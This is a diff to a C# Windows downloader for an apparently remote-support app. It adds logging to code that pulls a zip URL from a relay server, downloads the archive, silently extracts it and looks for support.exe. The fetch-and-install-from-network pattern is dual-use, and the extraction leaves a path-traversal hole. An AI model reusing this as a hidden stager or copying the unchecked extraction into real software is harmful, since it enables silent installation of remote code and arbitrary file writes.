@@ -10,21 +10,30 @@ class Downloader {
     const string RELAY     = "https://aegis-relay-production.up.railway.app";
     const string RELAY_WSS = "wss://aegis-relay-production.up.railway.app";
 
+    static string _log = Path.Combine(Path.GetTempPath(), "aegis-dl.log");
+    static void Log(string msg) {
+        try { File.AppendAllText(_log, DateTime.Now.ToString("HH:mm:ss") + " " + msg + "\r\n"); } catch { }
+    }
+
     [STAThread]
     static void Main(string[] args) {
         bool created;
         new Mutex(true, "AegisDownloader_v1", out created);
-        if (!created) return;
-        try { Run(args.Length > 0 ? args[0] : ""); } catch { }
+        if (!created) { Log("already running, exit"); return; }
+        try { Run(args.Length > 0 ? args[0] : ""); }
+        catch (Exception ex) { Log("FATAL: " + ex); }
     }
 
     static void Run(string key) {
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2 for all calls
+        Log("start key=" + (string.IsNullOrEmpty(key) ? "(none)" : key));
         // Derive key from own filename if not passed as arg
         if (string.IsNullOrEmpty(key)) {
             string fn = Path.GetFileNameWithoutExtension(
                 System.Reflection.Assembly.GetExecutingAssembly().Location);
             fn = Regex.Replace(fn, @" \(\d+\)$", "");
             if (fn.StartsWith("downloader-")) key = fn.Substring("downloader-".Length);
+            Log("key from filename: " + (string.IsNullOrEmpty(key) ? "(none)" : key));
         }
 
         // Fetch app names from relay
@@ -38,12 +47,14 @@ class Downloader {
                     "{\"key\":\"" + key + "\"}");
                 firstName  = Json(r, "appName")  ?? "Support";
                 secondName = Json(r, "appName2") ?? "";
-            } catch { }
+                Log("key-meta ok firstName=" + firstName + " second=" + secondName);
+            } catch (Exception ex) { Log("key-meta ERR: " + ex.Message); }
         }
 
         // Install dir = where this exe lives (placed there by the installer)
         string installDir = Path.GetDirectoryName(
             System.Reflection.Assembly.GetExecutingAssembly().Location);
+        Log("installDir=" + installDir);
 
         // Get zip URL from relay
         string zipUrl = "";
@@ -51,36 +62,42 @@ class Downloader {
             var wc = new WebClient();
             string r = wc.DownloadString(RELAY + "/api/app-package");
             zipUrl = Json(r, "url") ?? "";
-        } catch { }
-        if (string.IsNullOrEmpty(zipUrl)) return;
+            Log("zipUrl=" + zipUrl);
+        } catch (Exception ex) { Log("app-package ERR: " + ex.Message); }
+        if (string.IsNullOrEmpty(zipUrl)) { Log("no zipUrl, exit"); return; }
 
         // Download zip to temp
         string zipPath = Path.Combine(Path.GetTempPath(),
             "aegis-pkg-" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".zip");
+        Log("downloading to " + zipPath);
         try {
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2
-            var wc = new WebClient();
-            wc.DownloadFile(zipUrl, zipPath);
-        } catch { return; }
+            var wc2 = new WebClient();
+            wc2.DownloadFile(zipUrl, zipPath);
+            Log("download done: " + new FileInfo(zipPath).Length + " bytes");
+        } catch (Exception ex) { Log("download ERR: " + ex.Message); return; }
 
         // Extract silently into install dir
+        Log("extracting...");
         try {
             using (var zip = ZipFile.OpenRead(zipPath)) {
+                int count = 0;
                 foreach (var entry in zip.Entries) {
                     if (string.IsNullOrEmpty(entry.Name)) continue;
                     string dest = Path.Combine(installDir,
                         entry.FullName.Replace('/', Path.DirectorySeparatorChar));
                     string dir = Path.GetDirectoryName(dest);
                     if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
-                    try { entry.ExtractToFile(dest, true); } catch { }
+                    try { entry.ExtractToFile(dest, true); count++; } catch (Exception ex) { Log("extract entry ERR " + entry.FullName + ": " + ex.Message); }
                 }
+                Log("extracted " + count + " files");
             }
-        } finally {
+        } catch (Exception ex) { Log("extract ERR: " + ex); }
+        finally {
             try { File.Delete(zipPath); } catch { }
         }
 
         string mainExe = Path.Combine(installDir, "support.exe");
-        if (!File.Exists(mainExe)) return;
+        if (!File.Exists(mainExe)) { Log("support.exe not found after extract"); return; }
 
         bool dual = !string.IsNullOrEmpty(secondName);
 
